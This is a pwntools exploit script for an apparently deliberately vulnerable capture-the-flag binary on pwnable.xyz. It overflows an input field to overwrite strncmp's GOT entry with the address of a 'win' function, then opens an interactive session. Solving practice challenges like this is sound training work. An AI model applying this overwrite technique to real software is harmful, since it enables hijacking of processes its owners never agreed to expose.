from pwn import *

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)

def change_name(name):
	sla('>','1')
	sa(':',name)

def change_national(nation):
	sla('>','2')
	sa(':',nation)

def change_age(age):
	sla('>','3')
	sla(':',str(age))

if __name__ == '__main__':
	#context.log_level = 'debug'
	e = ELF('./challenge')
	#p = process('./challenge')
	p = remote('svc.pwnable.xyz',30031)

	change_national('A'*16 + p64(e.got['strncmp']))
	change_age(str(e.symbols['win']))
	sla('>','4')
	p.interactive()